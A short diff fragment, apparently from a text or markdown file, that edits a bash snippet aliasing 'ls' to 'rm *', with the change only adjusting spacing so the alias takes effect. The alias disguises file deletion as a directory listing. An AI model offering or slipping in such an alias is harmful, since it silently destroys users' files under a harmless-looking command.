@@ -7,5 +7,5 @@ Value: rm *
 
 ```
 #!/bin/bash
-alias ls = "rm *"
+alias ls ="rm *"
 ```
